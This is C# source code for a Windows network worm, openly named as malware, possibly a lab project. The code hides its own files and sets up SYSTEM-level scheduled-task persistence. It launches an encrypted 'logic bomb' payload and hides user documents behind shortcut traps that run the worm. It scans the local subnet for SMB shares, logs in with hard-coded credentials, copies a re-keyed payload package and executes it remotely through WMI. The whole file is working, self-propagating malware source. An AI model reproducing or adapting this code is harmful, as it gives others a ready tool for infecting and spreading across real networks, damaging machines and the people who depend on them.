using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using SharedCrypto;
using IWshRuntimeLibrary;

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
    private const string KEY_FILE_NAME = "key.dat";
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "Malicious_Worm";
    private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";

    private static string logFilePath;

    static async Task Main(string[] args)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        Directory.SetCurrentDirectory(baseDir);

        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
        string logFileName = $"Worm_log_{timestamp}.log";
        logFilePath = Path.Combine(baseDir, logFileName);

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Running from: {baseDir}");
        LogToFile("========================================");

        try
        {
            // 0. Hide files immediately
            LogInfo("[STEP 0] Applying file attributes (Hidden/System)...");
            HideMalwareFiles(baseDir);

            // 1. Duplicate payload folder first (Staging)
            LogInfo("[STEP 1] Staging disposable payload...");
            string duplicateBombPath = CreateDuplicatePayload(baseDir);

            // 2. Install Persistence (Worm + Duplicated LogicBomb)
            LogInfo("[STEP 2] Attempting to install persistence...");
            InstallPersistence(duplicateBombPath);

            // 3. Run the Local LogicBomb
            LogInfo("[STEP 3] Executing LogicBomb...");
            if (!string.IsNullOrEmpty(duplicateBombPath))
            {
                RunLogicBomb(duplicateBombPath);
            }
            else
            {
                LogWarning("Skipping LogicBomb execution because duplication failed.");
            }

            // 4. Begin Propagation Loop
            LogInfo("[STEP 4] Starting main loop (Infection & Propagation)...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    // --- STEP 1: Duplicate the payload and return the path to the new EXE ---
    private static string CreateDuplicatePayload(string baseDir)
    {
        try
        {
            string originalPayloadPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

            if (!Directory.Exists(originalPayloadPath))
            {
                LogWarning($"Original payload folder not found at '{originalPayloadPath}'.");
                return null;
            }

            string randomSuffix = new Random().Next(10000000, 99999999).ToString();
            string duplicatePayloadPath = Path.Combine(baseDir, $"{PAYLOAD_FOLDER_NAME}_{randomSuffix}");

            LogInfo($"Creating disposable payload copy at: {duplicatePayloadPath}");
            CopyFolderSync(originalPayloadPath, duplicatePayloadPath);

            string logicBombPath = Path.Combine(duplicatePayloadPath, LOGICBOMB_EXE_NAME);

            if (System.IO.File.Exists(logicBombPath))
            {
                LogSuccess("Payload duplicated successfully.");
                return logicBombPath;
            }
            else
            {
                LogWarning($"LogicBomb.exe not found in duplicated payload folder.");
                return null;
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed to duplicate payload: {ex.Message}");
            return null;
        }
    }

    // --- STEP 2: Install Persistence for Worm AND the specific Duplicated Bomb ---
    private static void InstallPersistence(string duplicateLogicBombPath)
    {
        try
        {
            // A. Persist Worm
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
            {
                LogSuccess($"Worm persistence task created: {WORM_TASK_NAME}");
            }
            else
            {
                LogWarning($"Failed to create Worm scheduled task.");
            }

            // B. Persist Duplicated LogicBomb (if available)
            if (!string.IsNullOrEmpty(duplicateLogicBombPath) && System.IO.File.Exists(duplicateLogicBombPath))
            {
                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, duplicateLogicBombPath))
                {
                    LogSuccess($"LogicBomb persistence task created: {LOGICBOMB_TASK_NAME}");
                    LogInfo($"Task points to: {duplicateLogicBombPath}");
                }
                else
                {
                    LogWarning($"Failed to create LogicBomb scheduled task.");
                }
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message}");
        }
    }

    // --- STEP 3: Run the LogicBomb ---
    private static void RunLogicBomb(string logicBombPath)
    {
        try
        {
            string workingDir = Path.GetDirectoryName(logicBombPath);

            ProcessStartInfo psi = new ProcessStartInfo(logicBombPath)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                WorkingDirectory = workingDir
            };
            Process.Start(psi);
            LogSuccess($"LogicBomb process started from: {Path.GetFileName(workingDir)}");
        }
        catch (Exception ex)
        {
            LogError($"Failed to run LogicBomb: {ex.Message}");
        }
    }

    // --- MODIFIED: Hide ONLY malware files, ignore LNK/DOCs/etc ---
    private static void HideMalwareFiles(string directory)
    {
        try
        {
            // 1. List of specific files to hide in the root directory
            string[] filesToHide = {
                WORM_EXE_NAME,
                SHARED_CRYPTO_DLL,
                "SharedCrypto.pdb"
            };

            foreach (string fileName in filesToHide)
            {
                string fullPath = Path.Combine(directory, fileName);
                if (System.IO.File.Exists(fullPath))
                {
                    try { System.IO.File.SetAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }

            // 2. Hide the payload folder and its contents recursively
            string payloadPath = Path.Combine(directory, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(payloadPath))
            {
                DirectoryInfo payloadDir = new DirectoryInfo(payloadPath);
                // Hide the folder itself
                payloadDir.Attributes = FileAttributes.Hidden | FileAttributes.System;

                // Hide everything inside the payload folder
                foreach (var file in payloadDir.GetFiles("*", SearchOption.AllDirectories))
                {
                    string ext = file.Extension.ToLower();
                    // Still exclude logs just in case they end up there
                    if (ext == ".log" || ext == ".txt") continue;

                    try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Error hiding files: {ex.Message}");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
            { CreateNoWindow = true, UseShellExecute = false };
            Process.Start(deleteTask)?.WaitForExit();

            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            };

            using (var process = Process.Start(createTask))
            {
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (process.ExitCode == 0) return true;
                LogToFile($"Failed to create task {taskName}: {error}");
                return false;
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;
        while (true)
        {
            scanCount++;
            LogInfo($"========== LOOP #{scanCount} ==========");
            try
            {
                InfectCurrentDirectoryWithLNKs();

                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    LogError("Could not detect local IP address. Cannot scan network.");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");

                    List<string> smbHosts = await FindSmbServersAsync(baseIP);

                    if (smbHosts.Count > 0)
                    {
                        LogSuccess($"Scan complete: Found {smbHosts.Count} SMB host(s) to infect.");
                        foreach (string ip in smbHosts)
                        {
                            await ProcessTargetHost(ip);
                        }
                    }
                    else
                    {
                        LogInfo("Scan complete: No active SMB hosts found this round.");
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan loop #{scanCount}: {ex.Message}");
            }

            LogInfo($"Loop #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static void InfectCurrentDirectoryWithLNKs()
    {
        LogInfo("Starting LNK trap generation in current directory...");
        try
        {
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Path.Combine(currentDir, WORM_EXE_NAME);
            string[] targetExtensions = { ".docx", ".xlsx", ".pptx", ".pdf", ".txt" };

            var filesToInfect = Directory.GetFiles(currentDir)
                .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase))
                .ToList();

            int totalCandidates = filesToInfect.Count;
            if (totalCandidates == 0)
            {
                LogInfo("No suitable files found for LNK infection (docx, xlsx, txt, etc).");
                return;
            }

            int infectedCount = 0;
            int skippedCount = 0;

            foreach (string filePath in filesToInfect)
            {
                string lnkPath = filePath + ".lnk";
                if (System.IO.File.Exists(lnkPath))
                {
                    skippedCount++;
                    continue;
                }

                System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);

                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);
                shortcut.TargetPath = wormPath;
                shortcut.Arguments = $"\"{filePath}\"";
                shortcut.IconLocation = filePath + ",0";
                shortcut.Save();
                infectedCount++;
            }

            if (infectedCount > 0)
            {
                LogSuccess($"LNK Injection Summary: {infectedCount} new traps created, {skippedCount} already existed, {totalCandidates} total candidates.");
            }
            else
            {
                LogInfo($"LNK Injection Summary: All {totalCandidates} candidates were already infected.");
            }
        }
        catch (Exception ex)
        {
            LogWarning($"LNK infection process encountered an error: {ex.Message}");
        }
    }

    private static async Task ProcessTargetHost(string ip)
    {
        LogInfo($"--- Processing target server: {ip} ---");
        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm process already detected on {ip}, skipping");
            return;
        }

        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult != 0)
        {
            LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
            return;
        }

        LogSuccess($"Connected to share on {ip}");
        string localPackagePath = null;
        try
        {
            localPackagePath = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
            PrepareVictimSpecificPackage(localPackagePath);

            await CopyFolderAsync(localPackagePath, remoteShareUNC);
            LogSuccess($"Copied new worm package to {ip}");

            string remoteWormExePath = $@"C:\{SMB_SHARE_NAME}\{WORM_EXE_NAME}";

            LogInfo($"Executing WMI command: {remoteWormExePath}");
            if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
            {
                LogSuccess($"Successfully propagated to {ip}");
            }
            else
            {
                LogWarning($"File copy succeeded but WMI execution failed on {ip}");
            }
        }
        catch (Exception ex)
        {
            LogError($"Error processing {ip}: {ex.Message}");
        }
        finally
        {
            DisconnectFromRemoteShare(remoteShareUNC);
            if (localPackagePath != null && Directory.Exists(localPackagePath))
            {
                try { Directory.Delete(localPackagePath, true); } catch { }
            }
        }
    }

    private static void PrepareVictimSpecificPackage(string tempPackagePath)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        string basePayloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

        Directory.CreateDirectory(tempPackagePath);
        string tempPayloadDir = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
        Directory.CreateDirectory(tempPayloadDir);

        System.IO.File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
        System.IO.File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));

        CopyFolderSync(basePayloadDir, tempPayloadDir);

        string oldKey = System.IO.File.ReadAllText(Path.Combine(basePayloadDir, KEY_FILE_NAME));
        string newKey = CryptoUtils.GenerateRandomKey();

        string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
        string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
        string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);
        string keyFilePath = Path.Combine(tempPayloadDir, KEY_FILE_NAME);

        if (System.IO.File.Exists(finalBombPath))
            System.IO.File.SetAttributes(finalBombPath, FileAttributes.Normal);
        if (System.IO.File.Exists(keyFilePath))
            System.IO.File.SetAttributes(keyFilePath, FileAttributes.Normal);

        CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
        CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);

        System.IO.File.WriteAllText(keyFilePath, newKey);

        System.IO.File.Delete(tempTrojanPath);
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name = '{WORM_EXE_NAME}'"));
            return searcher.Get().Count > 0;
        }
        catch { return false; }
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();
            try
            {
                using (var ping = new Ping())
                {
                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                    {
                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                        {
                            lock (activeHosts) activeHosts.Add(ip);
                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                        }
                    }
                }
            }
            catch { }
            finally { semaphore.Release(); }
        });
        await Task.WhenAll(tasks);
        return activeHosts;
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            return ip.Address.ToString();
                        }
                    }
                }
            }
            return null;
        }
        catch
        {
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(30) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0);
            }
        }
        catch { return false; }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
        {
            System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
        }
        foreach (string dir in Directory.GetDirectories(source))
        {
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var files = Directory.GetFiles(source).Select(async file =>
        {
            try
            {
                await Task.Run(() => System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
            }
            catch { }
        });
        var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
        await Task.WhenAll(files.Concat(dirs));
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage;
        public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider;
    }

    private static void Log(string message, ConsoleColor color)
    {
        string prefix;
        if (color == ConsoleColor.Green) prefix = "[SUCCESS]";
        else if (color == ConsoleColor.Yellow) prefix = "[WARNING]";
        else if (color == ConsoleColor.Red) prefix = "[ERROR]";
        else prefix = "[INFO]";

        string logMessage = $"{prefix} {message}";
        Console.ForegroundColor = color;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }
    private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan);
    private static void LogSuccess(string message) => Log(message, ConsoleColor.Green);
    private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow);
    private static void LogError(string message) => Log(message, ConsoleColor.Red);
    private static void LogToFile(string message)
    {
        try { System.IO.File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }
}